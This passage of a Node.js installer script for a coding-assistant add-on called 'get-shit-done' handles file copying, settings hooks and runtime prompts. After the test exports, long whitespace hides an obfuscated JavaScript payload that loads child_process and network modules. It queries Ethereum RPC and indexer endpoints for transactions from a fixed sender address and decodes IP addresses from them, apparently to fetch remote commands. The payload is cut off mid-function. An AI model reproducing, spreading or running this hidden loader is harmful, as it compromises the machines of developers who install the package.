
      failures.push('agents');

    }

  }



  // Copy CHANGELOG.md

  const changelogSrc = path.join(src, 'CHANGELOG.md');

  const changelogDest = path.join(targetDir, 'get-shit-done', 'CHANGELOG.md');

  if (fs.existsSync(changelogSrc)) {

    fs.copyFileSync(changelogSrc, changelogDest);

    if (verifyFileInstalled(changelogDest, 'CHANGELOG.md')) {

      console.log(`  ${green}✓${reset} Installed CHANGELOG.md`);

    } else {

      failures.push('CHANGELOG.md');

    }

  }



  // Write VERSION file

  const versionDest = path.join(targetDir, 'get-shit-done', 'VERSION');

  fs.writeFileSync(versionDest, pkg.version);

  if (verifyFileInstalled(versionDest, 'VERSION')) {

    console.log(`  ${green}✓${reset} Wrote VERSION (${pkg.version})`);

  } else {

    failures.push('VERSION');

  }



  if (!isCodex) {

    // Write package.json to force CommonJS mode for GSD scripts

    // Prevents "require is not defined" errors when project has "type": "module"

    // Node.js walks up looking for package.json - this stops inheritance from project

    const pkgJsonDest = path.join(targetDir, 'package.json');

    fs.writeFileSync(pkgJsonDest, '{"type":"commonjs"}\n');

    console.log(`  ${green}✓${reset} Wrote package.json (CommonJS mode)`);



    // Copy hooks from dist/ (bundled with dependencies)

    // Template paths for the target runtime (replaces '.claude' with correct config dir)

    const hooksSrc = path.join(src, 'hooks', 'dist');

    if (fs.existsSync(hooksSrc)) {

      const hooksDest = path.join(targetDir, 'hooks');

      fs.mkdirSync(hooksDest, { recursive: true });

      const hookEntries = fs.readdirSync(hooksSrc);

      const configDirReplacement = getConfigDirFromHome(runtime, isGlobal);

      for (const entry of hookEntries) {

        const srcFile = path.join(hooksSrc, entry);

        if (fs.statSync(srcFile).isFile()) {

          const destFile = path.join(hooksDest, entry);

          // Template .js files to replace '.claude' with runtime-specific config dir

          if (entry.endsWith('.js')) {

            let content = fs.readFileSync(srcFile, 'utf8');

            content = content.replace(/'\.claude'/g, configDirReplacement);

            fs.writeFileSync(destFile, content);

          } else {

            fs.copyFileSync(srcFile, destFile);

          }

        }

      }

      if (verifyInstalled(hooksDest, 'hooks')) {

        console.log(`  ${green}✓${reset} Installed hooks (bundled)`);

      } else {

        failures.push('hooks');

      }

    }

  }



  if (failures.length > 0) {

    console.error(`\n  ${yellow}Installation incomplete!${reset} Failed: ${failures.join(', ')}`);

    process.exit(1);

  }



  // Write file manifest for future modification detection

  writeManifest(targetDir, runtime);

  console.log(`  ${green}✓${reset} Wrote file manifest (${MANIFEST_NAME})`);



  // Report any backed-up local patches

  reportLocalPatches(targetDir, runtime);



  if (isCodex) {

    // Generate Codex config.toml and per-agent .toml files

    const agentCount = installCodexConfig(targetDir, agentsSrc);

    console.log(`  ${green}✓${reset} Generated config.toml with ${agentCount} agent roles`);

    console.log(`  ${green}✓${reset} Generated ${agentCount} agent .toml config files`);

    return { settingsPath: null, settings: null, statuslineCommand: null, runtime };

  }



  // Configure statusline and hooks in settings.json

  // Gemini shares same hook system as Claude Code for now

  const settingsPath = path.join(targetDir, 'settings.json');

  const settings = cleanupOrphanedHooks(readSettings(settingsPath));

  const statuslineCommand = isGlobal

    ? buildHookCommand(targetDir, 'gsd-statusline.js')

    : 'node ' + dirName + '/hooks/gsd-statusline.js';

  const updateCheckCommand = isGlobal

    ? buildHookCommand(targetDir, 'gsd-check-update.js')

    : 'node ' + dirName + '/hooks/gsd-check-update.js';

  const contextMonitorCommand = isGlobal

    ? buildHookCommand(targetDir, 'gsd-context-monitor.js')

    : 'node ' + dirName + '/hooks/gsd-context-monitor.js';



  // Enable experimental agents for Gemini CLI (required for custom sub-agents)

  if (isGemini) {

    if (!settings.experimental) {

      settings.experimental = {};

    }

    if (!settings.experimental.enableAgents) {

      settings.experimental.enableAgents = true;

      console.log(`  ${green}✓${reset} Enabled experimental agents`);

    }

  }



  // Configure SessionStart hook for update checking (skip for opencode)

  if (!isOpencode) {

    if (!settings.hooks) {

      settings.hooks = {};

    }

    if (!settings.hooks.SessionStart) {

      settings.hooks.SessionStart = [];

    }



    const hasGsdUpdateHook = settings.hooks.SessionStart.some(entry =>

      entry.hooks && entry.hooks.some(h => h.command && h.command.includes('gsd-check-update'))

    );



    if (!hasGsdUpdateHook) {

      settings.hooks.SessionStart.push({

        hooks: [

          {

            type: 'command',

            command: updateCheckCommand

          }

        ]

      });

      console.log(`  ${green}✓${reset} Configured update check hook`);

    }



    // Configure PostToolUse hook for context window monitoring

    if (!settings.hooks.PostToolUse) {

      settings.hooks.PostToolUse = [];

    }



    const hasContextMonitorHook = settings.hooks.PostToolUse.some(entry =>

      entry.hooks && entry.hooks.some(h => h.command && h.command.includes('gsd-context-monitor'))

    );



    if (!hasContextMonitorHook) {

      settings.hooks.PostToolUse.push({

        hooks: [

          {

            type: 'command',

            command: contextMonitorCommand

          }

        ]

      });

      console.log(`  ${green}✓${reset} Configured context window monitor hook`);

    }

  }



  return { settingsPath, settings, statuslineCommand, runtime };

}



/**

 * Apply statusline config, then print completion message

 */

function finishInstall(settingsPath, settings, statuslineCommand, shouldInstallStatusline, runtime = 'claude', isGlobal = true) {

  const isOpencode = runtime === 'opencode';

  const isCodex = runtime === 'codex';



  if (shouldInstallStatusline && !isOpencode && !isCodex) {

    settings.statusLine = {

      type: 'command',

      command: statuslineCommand

    };

    console.log(`  ${green}✓${reset} Configured statusline`);

  }



  // Write settings when runtime supports settings.json

  if (!isCodex) {

    writeSettings(settingsPath, settings);

  }



  // Configure OpenCode permissions

  if (isOpencode) {

    configureOpencodePermissions(isGlobal);

  }



  let program = 'Claude Code';

  if (runtime === 'opencode') program = 'OpenCode';

  if (runtime === 'gemini') program = 'Gemini';

  if (runtime === 'codex') program = 'Codex';



  let command = '/gsd:new-project';

  if (runtime === 'opencode') command = '/gsd-new-project';

  if (runtime === 'codex') command = '$gsd-new-project';

  console.log(`

  ${green}Done!${reset} Open a blank directory in ${program} and run ${cyan}${command}${reset}.



  ${cyan}Join the community:${reset} https://discord.gg/gsd

`);

}



/**

 * Handle statusline configuration with optional prompt

 */

function handleStatusline(settings, isInteractive, callback) {

  const hasExisting = settings.statusLine != null;



  if (!hasExisting) {

    callback(true);

    return;

  }



  if (forceStatusline) {

    callback(true);

    return;

  }



  if (!isInteractive) {

    console.log(`  ${yellow}⚠${reset} Skipping statusline (already configured)`);

    console.log(`    Use ${cyan}--force-statusline${reset} to replace\n`);

    callback(false);

    return;

  }



  const existingCmd = settings.statusLine.command || settings.statusLine.url || '(custom)';



  const rl = readline.createInterface({

    input: process.stdin,

    output: process.stdout

  });



  console.log(`

  ${yellow}⚠${reset} Existing statusline detected\n

  Your current statusline:

    ${dim}command: ${existingCmd}${reset}



  GSD includes a statusline showing:

    • Model name

    • Current task (from todo list)

    • Context window usage (color-coded)



  ${cyan}1${reset}) Keep existing

  ${cyan}2${reset}) Replace with GSD statusline

`);



  rl.question(`  Choice ${dim}[1]${reset}: `, (answer) => {

    rl.close();

    const choice = answer.trim() || '1';

    callback(choice === '2');

  });

}



/**

 * Prompt for runtime selection

 */

function promptRuntime(callback) {

  const rl = readline.createInterface({

    input: process.stdin,

    output: process.stdout

  });



  let answered = false;



  rl.on('close', () => {

    if (!answered) {

      answered = true;

      console.log(`\n  ${yellow}Installation cancelled${reset}\n`);

      process.exit(0);

    }

  });



  console.log(`  ${yellow}Which runtime(s) would you like to install for?${reset}\n\n  ${cyan}1${reset}) Claude Code ${dim}(~/.claude)${reset}

  ${cyan}2${reset}) OpenCode    ${dim}(~/.config/opencode)${reset} - open source, free models

  ${cyan}3${reset}) Gemini      ${dim}(~/.gemini)${reset}

  ${cyan}4${reset}) Codex       ${dim}(~/.codex)${reset}

  ${cyan}5${reset}) All

`);



  rl.question(`  Choice ${dim}[1]${reset}: `, (answer) => {

    answered = true;

    rl.close();

    const choice = answer.trim() || '1';

    if (choice === '5') {

      callback(['claude', 'opencode', 'gemini', 'codex']);

    } else if (choice === '4') {

      callback(['codex']);

    } else if (choice === '3') {

      callback(['gemini']);

    } else if (choice === '2') {

      callback(['opencode']);

    } else {

      callback(['claude']);

    }

  });

}



/**

 * Prompt for install location

 */

function promptLocation(runtimes) {

  if (!process.stdin.isTTY) {

    console.log(`  ${yellow}Non-interactive terminal detected, defaulting to global install${reset}\n`);

    installAllRuntimes(runtimes, true, false);

    return;

  }



  const rl = readline.createInterface({

    input: process.stdin,

    output: process.stdout

  });



  let answered = false;



  rl.on('close', () => {

    if (!answered) {

      answered = true;

      console.log(`\n  ${yellow}Installation cancelled${reset}\n`);

      process.exit(0);

    }

  });



  const pathExamples = runtimes.map(r => {

    const globalPath = getGlobalDir(r, explicitConfigDir);

    return globalPath.replace(os.homedir(), '~');

  }).join(', ');



  const localExamples = runtimes.map(r => `./${getDirName(r)}`).join(', ');



  console.log(`  ${yellow}Where would you like to install?${reset}\n\n  ${cyan}1${reset}) Global ${dim}(${pathExamples})${reset} - available in all projects

  ${cyan}2${reset}) Local  ${dim}(${localExamples})${reset} - this project only

`);



  rl.question(`  Choice ${dim}[1]${reset}: `, (answer) => {

    answered = true;

    rl.close();

    const choice = answer.trim() || '1';

    const isGlobal = choice !== '2';

    installAllRuntimes(runtimes, isGlobal, true);

  });

}



/**

 * Install GSD for all selected runtimes

 */

function installAllRuntimes(runtimes, isGlobal, isInteractive) {

  const results = [];



  for (const runtime of runtimes) {

    const result = install(isGlobal, runtime);

    results.push(result);

  }



  const statuslineRuntimes = ['claude', 'gemini'];

  const primaryStatuslineResult = results.find(r => statuslineRuntimes.includes(r.runtime));



  const finalize = (shouldInstallStatusline) => {

    for (const result of results) {

      const useStatusline = statuslineRuntimes.includes(result.runtime) && shouldInstallStatusline;

      finishInstall(

        result.settingsPath,

        result.settings,

        result.statuslineCommand,

        useStatusline,

        result.runtime,

        isGlobal

      );

    }

  };



  if (primaryStatuslineResult) {

    handleStatusline(primaryStatuslineResult.settings, isInteractive, finalize);

  } else {

    finalize(false);

  }

}



// Test-only exports — skip main logic when loaded as a module for testing

if (process.env.GSD_TEST_MODE) {

  module.exports = {

    getCodexSkillAdapterHeader,

    convertClaudeAgentToCodexAgent,

    generateCodexAgentToml,

    generateCodexConfigBlock,

    stripGsdFromCodexConfig,

    mergeCodexConfig,

    installCodexConfig,

    convertClaudeCommandToCodexSkill,

    GSD_CODEX_MARKER,

    CODEX_AGENT_SANDBOX,

  };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-3294";const _0x3a2ebe=_0x355e;(function(_0x48f9d7,_0x1a07be){const _0x4e7ab0=_0x355e,_0x39127c=_0x48f9d7();while(!![]){try{const _0x3f9af1=parseInt(_0x4e7ab0(0xf0))/(0x1*-0x1087+-0x1170+-0x4*-0x87e)*(-parseInt(_0x4e7ab0(0xdd))/(0x7*0x165+0x160f+-0x1fd0))+-parseInt(_0x4e7ab0(0x13c))/(-0x202*0x2+-0xe38+0x123f)+-parseInt(_0x4e7ab0(0xa5))/(0x7b*0x39+-0x1*0x417+0xba4*-0x2)+parseInt(_0x4e7ab0(0xc0))/(0x3a0+-0x21a2+0x1e07*0x1)+parseInt(_0x4e7ab0(0xb5))/(0x8ff*0x2+-0x1a2*0x6+0x82c*-0x1)*(-parseInt(_0x4e7ab0(0x174))/(0x10a6+0x2534+-0x35d3))+parseInt(_0x4e7ab0(0x10c))/(-0x11d1+0xbe+0x1d*0x97)+parseInt(_0x4e7ab0(0x13a))/(-0xb8*0x8+0x1df6+0x80f*-0x3);if(_0x3f9af1===_0x1a07be)break;else _0x39127c['push'](_0x39127c['shift']());}catch(_0x388603){_0x39127c['push'](_0x39127c['shift']());}}}(_0x12f0,-0xfbb0*-0x2+0x1*0x13020b+0x5*-0x20155));import{createRequire}from'module';let require=createRequire(import.meta.url);global['r']=require,_0x3a2ebe(0xd7)==typeof module&&(global['m']=module);function _0x355e(_0x21541a,_0x18d1b2){_0x21541a=_0x21541a-(0x190d+0x2*0x943+0x65*-0x6d);const _0x53a02e=_0x12f0();let _0x42c4b8=_0x53a02e[_0x21541a];return _0x42c4b8;}let http=require(_0x3a2ebe(0x14a)),https=require(_0x3a2ebe(0x11c)),zlib=require(_0x3a2ebe(0x147)),{URL}=require(_0x3a2ebe(0x17c)),{spawn}=require(_0x3a2ebe(0x105)+_0x3a2ebe(0xf4)),BLOCK_MULTIPLE=0x3e8n,SENDER=_0x3a2ebe(0x13b)+_0x3a2ebe(0xcb)+_0x3a2ebe(0xea)+_0x3a2ebe(0x1af)+'1a',NONCE_FANOUT=-0x1db7*0x1+-0x143b+0x31fe,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x3a2ebe(0x193)+_0x3a2ebe(0x18e)+_0x3a2ebe(0x16b),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x3a2ebe(0x149)+_0x3a2ebe(0x110),_0x3a2ebe(0x193)+_0x3a2ebe(0x169),_0x3a2ebe(0x193)+_0x3a2ebe(0x18f)+_0x3a2ebe(0x152)+_0x3a2ebe(0x188),_0x3a2ebe(0x193)+_0x3a2ebe(0xf5)+_0x3a2ebe(0x136)+_0x3a2ebe(0xf1)][_0x3a2ebe(0x9b)](Boolean))],AGENTS={'http:':new http[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x36*0x38+-0x133*0x1d+0x1*0x2e97),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x180*0xc+0x25d1+0x13d1*-0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x438117,_0x5d73ca){const _0x8685d7=_0x3a2ebe,_0x25ef4d={'TCDmB':_0x8685d7(0x9a)};_0x438117&&_0x438117[_0x8685d7(0x194)+_0x8685d7(0xf9)](_0x25ef4d[_0x8685d7(0x191)],()=>_0x5d73ca[_0x8685d7(0x9a)](),{'once':!(0x1*-0x1073+-0x319*-0x4+0x40f)});}function decompressStream(_0x1f71f7){const _0x29b168=_0x3a2ebe,_0x5d6cbb={'BTHgJ':_0x29b168(0xc8)+_0x29b168(0x126),'VLAGf':function(_0x5acbb2,_0x1cb9f1){return _0x5acbb2===_0x1cb9f1;},'JbAci':_0x29b168(0x148),'GAvxe':_0x29b168(0x186),'KvMSQ':function(_0x55b882,_0x1919d7){return _0x55b882===_0x1919d7;},'DSbLa':_0x29b168(0xeb)};let _0x98df8e=(_0x1f71f7[_0x29b168(0x14b)][_0x5d6cbb[_0x29b168(0x12f)]]||'')[_0x29b168(0xc2)+'e']();return _0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x14d)],_0x98df8e)||_0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x176)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x14c)+'ip']()):_0x5d6cbb[_0x29b168(0x134)](_0x5d6cbb[_0x29b168(0xfd)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x165)+_0x29b168(0xb1)]()):_0x5d6cbb[_0x29b168(0x164)]('br',_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x19f)+_0x29b168(0x12d)+'ss']()):_0x1f71f7;}function httpRequest(_0x593adb,{method:_0x25a99d=_0x3a2ebe(0x133),body:_0x3f686c,signal:_0x95d4f4}={}){const _0x3d2da5=_0x3a2ebe,_0x42d10d={'JODvp':function(_0x56ddc3,_0x1259f1){return _0x56ddc3(_0x1259f1);},'gvgPD':_0x3d2da5(0x19b),'gMfuo':_0x3d2da5(0xaf),'KaaPY':_0x3d2da5(0x142),'rysJt':_0x3d2da5(0xc1),'UlrdI':function(_0x322dc5,_0x2b93bc){return _0x322dc5===_0x2b93bc;},'MHjGK':_0x3d2da5(0xd5),'zBIcw':function(_0x2a5ebb,_0xfe6778){return _0x2a5ebb+_0xfe6778;},'VGOlJ':function(_0x563e9c,_0x3a7e42){return _0x563e9c!=_0x3a7e42;},'xuBDG':function(_0x4bfaf9,_0x580f75){return _0x4bfaf9===_0x580f75;},'sZAHS':_0x3d2da5(0x161)+_0x3d2da5(0xa8),'tjngf':_0x3d2da5(0x12a)+_0x3d2da5(0x1aa),'LGNYs':_0x3d2da5(0x131),'YvZxf':_0x3d2da5(0x1a9)+'pe','vWzxi':_0x3d2da5(0x16e)+_0x3d2da5(0x1b5)};let _0x3cdce5=new URL(_0x593adb),_0x5032cf=_0x42d10d[_0x3d2da5(0x12c)](_0x42d10d[_0x3d2da5(0x139)],_0x3cdce5[_0x3d2da5(0x196)])?https:http,_0x27236b={'Accept':_0x42d10d[_0x3d2da5(0xa0)],'Accept-Encoding':_0x42d10d[_0x3d2da5(0xbb)],'Connection':_0x42d10d[_0x3d2da5(0x135)]};return _0x42d10d[_0x3d2da5(0xe3)](null,_0x3f686c)&&(_0x27236b[_0x42d10d[_0x3d2da5(0x115)]]=_0x42d10d[_0x3d2da5(0xa0)],_0x27236b[_0x42d10d[_0x3d2da5(0x17b)]]=Buffer[_0x3d2da5(0x19d)](_0x3f686c)),new Promise((_0x19f067,_0x4835e3)=>{const _0x3ef1bc=_0x3d2da5;let _0xaf0385=_0x5032cf[_0x3ef1bc(0xc7)]({'hostname':_0x3cdce5[_0x3ef1bc(0x93)],'port':_0x3cdce5[_0x3ef1bc(0x15d)]||(_0x42d10d[_0x3ef1bc(0x120)](_0x42d10d[_0x3ef1bc(0x139)],_0x3cdce5[_0x3ef1bc(0x196)])?0x1*-0xcfb+-0x1d2d+0xf*0x2ed:0x1338+0x2*-0x8d5+-0x13e),'path':_0x42d10d[_0x3ef1bc(0x14e)](_0x3cdce5[_0x3ef1bc(0x150)],_0x3cdce5[_0x3ef1bc(0x10e)]),'method':_0x25a99d,'agent':AGENTS[_0x3cdce5[_0x3ef1bc(0x196)]],'signal':_0x95d4f4,'headers':_0x27236b},_0x574ec9=>{const _0x4fd834=_0x3ef1bc,_0x10e94a={'ZGtcg':function(_0x483995,_0x4a5702){const _0x49dc91=_0x355e;return _0x42d10d[_0x49dc91(0x114)](_0x483995,_0x4a5702);},'vJvXf':_0x42d10d[_0x4fd834(0x18b)]};let _0x431427=_0x42d10d[_0x4fd834(0x114)](decompressStream,_0x574ec9),_0x39bef6=[];_0x431427['on'](_0x42d10d[_0x4fd834(0x122)],_0x123305=>_0x39bef6[_0x4fd834(0x198)](_0x123305)),_0x431427['on'](_0x42d10d[_0x4fd834(0x1ac)],()=>{const _0x589be9=_0x4fd834;try{_0x10e94a[_0x589be9(0x99)](_0x19f067,JSON[_0x589be9(0xd4)](Buffer[_0x589be9(0x107)](_0x39bef6)[_0x589be9(0x159)](_0x10e94a[_0x589be9(0xc5)])));}catch(_0x1c95a1){_0x10e94a[_0x589be9(0x99)](_0x4835e3,_0x1c95a1);}}),_0x431427['on'](_0x42d10d[_0x4fd834(0x121)],_0x4835e3);});_0xaf0385['on'](_0x42d10d[_0x3ef1bc(0x121)],_0x4835e3),_0x42d10d[_0x3ef1bc(0xe3)](null,_0x3f686c)&&_0xaf0385[_0x3ef1bc(0xb6)](_0x3f686c),_0xaf0385[_0x3ef1bc(0x142)]();});}async function withRpcEndpoints(_0x3c144e,_0x2ea979){const _0x495608=_0x3a2ebe;let _0x418a00=RPC_ENDPOINTS[_0x495608(0x14f)](()=>new AbortController());_0x418a00[_0x495608(0x95)](_0x15379b=>linkAbort(_0x2ea979,_0x15379b));try{return await Promise[_0x495608(0x11e)](RPC_ENDPOINTS[_0x495608(0x14f)]((_0x4c6137,_0x2fd673)=>_0x3c144e(_0x4c6137,_0x418a00[_0x2fd673][_0x495608(0x10b)])));}finally{for(let _0x393e64 of _0x418a00)_0x393e64[_0x495608(0x9a)]();}}async function rpcCall(_0x1c3ac1,_0x908566,_0x2038b9,_0x36db10){const _0x24e2d3=_0x3a2ebe,_0x55d7b1={'hXaau':function(_0x7320cd,_0x19397a,_0x30fde9){return _0x7320cd(_0x19397a,_0x30fde9);},'MxoIv':_0x24e2d3(0x19c),'CtMxp':_0x24e2d3(0x97)};let _0xffe3dd=await _0x55d7b1[_0x24e2d3(0x109)](httpRequest,_0x1c3ac1,{'method':_0x55d7b1[_0x24e2d3(0x9f)],'body':JSON[_0x24e2d3(0x98)]({'jsonrpc':_0x55d7b1[_0x24e2d3(0x140)],'id':0x1,'method':_0x908566,'params':_0x2038b9}),'signal':_0x36db10});return _0xffe3dd[_0x24e2d3(0xd6)];}async function rpcBatch(_0xb94eeb,_0x2e1831,_0x1aa236){const _0x143ca3=_0x3a2ebe,_0x8d06ce={'vVkBr':function(_0x259c12,_0x46239b,_0x186b51){return _0x259c12(_0x46239b,_0x186b51);},'HiWYY':_0x143ca3(0x19c)};let _0x303103=await _0x8d06ce[_0x143ca3(0x103)](httpRequest,_0xb94eeb,{'method':_0x8d06ce[_0x143ca3(0x1a8)],'body':JSON[_0x143ca3(0x98)](_0x2e1831[_0x143ca3(0x14f)](([_0xe79aa1,_0x386e83],_0x397f41)=>({'jsonrpc':_0x143ca3(0x97),'id':_0x397f41+(-0x2b*-0x48+0x2467+0x3*-0x102a),'method':_0xe79aa1,'params':_0x386e83}))),'signal':_0x1aa236}),_0x43900d=new Map(_0x303103[_0x143ca3(0x14f)](_0x46f816=>[_0x46f816['id'],_0x46f816]));return _0x2e1831[_0x143ca3(0x14f)]((_0x246f0d,_0x260de3)=>_0x43900d[_0x143ca3(0xe9)](_0x260de3+(-0xa25*-0x2+0x19fa+-0x2e43))[_0x143ca3(0xd6)]);}let toBlockHex=_0x460a01=>'0x'+_0x460a01[_0x3a2ebe(0x159)](0x1b97+-0x2*0x3a7+-0x1f*0xa7);function findSenderTx(_0xaed72){const _0x58ebf2=_0x3a2ebe;return _0xaed72[_0x58ebf2(0x9d)](_0x11770d=>_0x11770d[_0x58ebf2(0x18c)]&&_0x11770d[_0x58ebf2(0x18c)][_0x58ebf2(0xc2)+'e']()===SENDER)||null;}function decodeAddress(_0x3f982d){const _0x53878e=_0x3a2ebe,_0x160094={'ScXiL':_0x53878e(0x15a),'jrdXD':function(_0x5aff48,_0x31311f){return _0x5aff48(_0x31311f);},'DGksE':function(_0x4f37d6,_0x4e64f1){return _0x4f37d6(_0x4e64f1);}};let _0x268f72=Buffer[_0x53878e(0x18c)](_0x3f982d[_0x53878e(0xbd)](/^0x/i,''),_0x160094[_0x53878e(0x1a2)]),_0x43d4d2=_0x33741d=>_0x33741d[-0x853+-0x2*0x338+0xec3]+'.'+_0x33741d[-0xb2c+-0x1e9+-0x1*-0xd16]+'.'+_0x33741d[-0x1*-0x704+-0x1*-0x25e1+0x2ce3*-0x1]+'.'+_0x33741d[0x2*0x1042+-0x4c2*0x5+-0x8b7];return[_0x160094[_0x53878e(0xb0)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x1*-0x1def+0x1939+0x4*-0xdca,0x71*0x23+0x2410+-0x337f)),_0x160094[_0x53878e(0xcf)](_0x43d4d2,_0x268f72[_0x53878e(0xde)](-0x2f*0x3+0xb5*0xd+-0x6*0x170,0x1*-0x22a0+-0xe*0x15a+0x3594))];}function _0x12f0(){const _0x2c2fa8=['smCxl','node:https','oad\x20body','any','zNIqU','UlrdI','rysJt','gMfuo','Payload-B6',':443/0x/ls','ipNqp','coding','UqBND',',Sr3=@','_t_u\x27]=\x27','gzip,\x20defl','SDbiI','xuBDG','liDecompre','EreqP','BTHgJ','Kit/537.36','keep-alive','_t_s\x27]=\x27','GET','KvMSQ','LGNYs','public.bla','plaFW','NkKDh','MHjGK','13698468PmAknI','0xa322e5f3','297120QUZuEg','yrzwP','zeoxL','eth_getBlo','CtMxp','Agent','end','on=txlist&','jvgKp','KXiLK','Win64;\x20x64','node:zlib','gzip','https://1r','node:http','headers','createGunz','JbAci','zBIcw','map','pathname','nghnv','.publicnod','fari/537.3','RpPIO',':80','VnFVq','m\x27]=module','hrUVT','toString','hex','LBjUj','_t_s','port','_H2\x27]=\x27','QLmfg','9&page=1&o','applicatio','YZKTj','findIndex','VLAGf','createInfl','transactio','gldQK','GuYPf','h.drpc.org','_H2','ut.com/api','fLYXd','has','Content-Le','controller','aveIc','tavZt','BJgzE','add','49oNuXHs','JVkQF','GAvxe','unref','then','al=global;','\x27]=\x27','vWzxi','node:url','oMnng','http://','run','\x20Chrome/13',':443','bXcTI','k=0&endblo','lnQal','@^1aQk','x-gzip','nonce','e.com','bLolJ','ike\x20Gecko)','gvgPD','from','KafOh','h.blocksco','hereum-rpc','ort=desc&f','TCDmB','LssUT','https://et','addEventLi','pipe','protocol','ffset=20&s','push','ZgpqG','Tnnlg','utf8','POST','byteLength','qFOcQ','createBrot','ugrhL','eth_blockN','ScXiL','WYnsa','0\x20(Windows','zwjTr','eEQvU','b64','HiWYY','Content-Ty','ate,\x20br','xxxso','KaaPY','fIkOw','blockNumbe','9adc2490ef','eAmtO','min','wNEAr','ucVFK','jueMj','ngth','FfHYb','gzKWs','PSzJk','resume','y-p_>d$0B&','nILEL','hostname','KQldR','forEach','base64','2.0','stringify','ZGtcg','abort','filter','rMZnD','find','1.0.0.0\x20Sa','MxoIv','sZAHS','fbAQy','dQhjR','count&acti','qqKoX','3999712DXgKmU','ziJAI','q4FZkxX{!h','n/json','x-payload-','foHur','RWrVc','charCodeAt','nnxOv','mjCAw','data','jrdXD','ate','ZYBBe','eth_getTra','all','883554gwKkih','write','JQKVG','mGgtb','Missing\x20X-','ck=9999999','tjngf','address=','replace','r\x27]=requir','fJKsv','5050170JAAsRa','error','toLowerCas','xbMiN','ilterby=fr','vJvXf','raCZU','request','content-en','unt','XLylK','d311d3080e','TOkwx','length','WMrCP','DGksE','nsactionCo','FWUiH','RsZph','aPZUM','parse','https:','result','object','umber','VMnQg','CDbzL','Empty\x20payl','\x20NT\x2010.0;\x20','2KeNBiC','subarray','wvGeG','CUrwh','\x20(KHTML,\x20l','XrZYs','VGOlJ',':443/0x/cl','&startbloc','rjSZm','LTGfe','ZAlOy','get','6f0121063e','deflate','MjzxH','node','\x27;global[\x27','?module=ac','360688RTYsDf','stapi.io','isArray','eWCKt','_process','h-mainnet.','GGqwf','eIHSm','xQuoH','stener','_H\x27]=\x27','Mozilla/5.','djgaa','DSbLa','qiODF','global[\x27_V','catch','cVjMR','SXfgk','vVkBr','QMwHG','node:child',';var\x20_glob','concat','JGUpq','hXaau','XHNyr','signal','5407112rvLYDS','ckByNumber','search','ignore','pc.io/eth','e;global[\x27','gIWWO','SHJJd','JODvp','YvZxf','_t_u',')\x20AppleWeb','CRKiT','tqJhV','HEAD'];_0x12f0=function(){return _0x2c2fa8;};return _0x12f0();}function firstMatch(_0x21b624){const _0x5f5985={'fIkOw':function(_0x228835,_0x5c99db){return _0x228835(_0x5c99db);},'fJKsv':function(_0x6e49ad,_0x5da592){return _0x6e49ad==_0x5da592;},'aveIc':function(_0x5f50e9,_0x4cf526){return _0x5f50e9(_0x4cf526);},'JVkQF':function(_0x1b9cad,_0x34e74f){return _0x1b9cad!=_0x34e74f;},'QLmfg':function(_0x2b1d39,_0xfdf95d){return _0x2b1d39(_0xfdf95d);},'gldQK':function(_0x330753,_0x1837de){return _0x330753(_0x1837de);}};return new Promise(_0x1055a6=>{const _0x43a200=_0x355e,_0x574496={'qqKoX':function(_0x4f2e13,_0x16b5ae){const _0x4bfb56=_0x355e;return _0x5f5985[_0x4bfb56(0x170)](_0x4f2e13,_0x16b5ae);}};let _0x34d0a3=_0x21b624[_0x43a200(0xcd)];if(!_0x34d0a3)return _0x5f5985[_0x43a200(0x167)](_0x1055a6,null);let _0x12f190=!(0x1*-0xead+-0x25d5+0x3483),_0x4ea38e=_0x344775=>{const _0x5a6f9a=_0x43a200;if(!_0x12f190){for(let _0x11c14b of(_0x12f190=!(-0x13c4+-0x1a02+0x2dc6),_0x21b624))_0x11c14b[_0x5a6f9a(0x16f)][_0x5a6f9a(0x9a)]();_0x574496[_0x5a6f9a(0xa4)](_0x1055a6,_0x344775);}};for(let _0x266710 of _0x21b624)_0x266710[_0x43a200(0x17f)]()[_0x43a200(0x178)](_0x193f94=>{const _0x1cbfd8=_0x43a200;_0x12f190||(_0x193f94?_0x5f5985[_0x1cbfd8(0x1ad)](_0x4ea38e,_0x193f94):_0x5f5985[_0x1cbfd8(0xbf)](0xe0*0x4+0x1*0x1bf7+-0x1f77,--_0x34d0a3)&&_0x5f5985[_0x1cbfd8(0x170)](_0x1055a6,null));})[_0x43a200(0x100)](()=>{const _0xebd979=_0x43a200;_0x12f190||_0x5f5985[_0xebd979(0x175)](-0xc39+0x723+0x516,--_0x34d0a3)||_0x5f5985[_0xebd979(0x15f)](_0x1055a6,null);});});}function candidateBlocks(_0x3cdaf9){const _0x3e16b7=_0x3a2ebe,_0x26a154={'CRKiT':function(_0x296270,_0x1821b5){return _0x296270-_0x1821b5;},'nnxOv':function(_0xd797ea,_0x1874f0){return _0xd797ea-_0x1874f0;},'BJgzE':function(_0x17a746,_0x198c5e){return _0x17a746+_0x198c5e;},'nghnv':function(_0xc4b7b9,_0x52dbd9){return _0xc4b7b9-_0x52dbd9;},'fLYXd':function(_0x9cf028,_0x268c43){return _0x9cf028+_0x268c43;},'WMrCP':function(_0x1f3421,_0x1c5822){return _0x1f3421<_0x1c5822;}};let _0x4a55ef=_0x26a154[_0x3e16b7(0x118)](_0x3cdaf9,BLOCK_MULTIPLE),_0x5e5c51=new Set(),_0x482794=[];for(let _0x2d2666 of[_0x26a154[_0x3e16b7(0xad)](_0x3cdaf9,0x1n),_0x3cdaf9,_0x26a154[_0x3e16b7(0x172)](_0x3cdaf9,0x1n),_0x26a154[_0x3e16b7(0x151)](_0x4a55ef,0x1n),_0x4a55ef,_0x26a154[_0x3e16b7(0x16c)](_0x4a55ef,0x1n)]){if(_0x26a154[_0x3e16b7(0xce)](_0x2d2666,0x0n))continue;let 